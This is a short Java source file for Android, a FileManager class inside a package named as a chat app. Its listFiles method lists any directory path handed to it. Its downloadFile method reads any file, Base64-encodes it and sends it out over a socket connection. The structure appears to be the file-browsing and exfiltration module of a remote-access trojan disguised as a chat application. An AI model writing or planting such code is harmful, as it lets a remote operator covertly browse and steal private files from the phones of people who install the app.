package com.example.chatapp.fiemanager;

import android.util.Base64;
import android.util.Log;

import com.example.chatapp.socket.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

public class FileManager {

    public static JSONArray listFiles(String path){
        JSONArray values = new JSONArray();
        File dir = new File(path);
        if (!dir.canRead()){
            Log.e("FileManager", "access permission denied");
        }
        File[] list = dir.listFiles();
        try {
            if (list != null){
                JSONObject parentObject = new JSONObject();
                parentObject.put("name", "../");
                parentObject.put("isDir", true);
                parentObject.put("path", dir.getParent());
                values.put(parentObject);
                for (File file: list){
                    if (!file.getName().startsWith(".")){
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        values.put(fileObj);
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return values;
    }

    public static void downloadFile(String path){
        if (path == null){
            return;
        }
        File file = new File(path);
        if (file.exists()){
            int size = (int) (file.length());
            byte[] data = new byte[size];

            try{
                BufferedInputStream buf =  new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0 , size);
                String data64 = Base64.encodeToString(data, Base64.DEFAULT);
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("name", file.getName());
                jsonObject.put("file", true);
                jsonObject.put("data", data64);
                IOSocket.getInstance().getIoSocket().emit("file", jsonObject);
                buf.close();

            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    public static void deleteFile(String path){

    }

    public static void createFile(String path){

    }
}
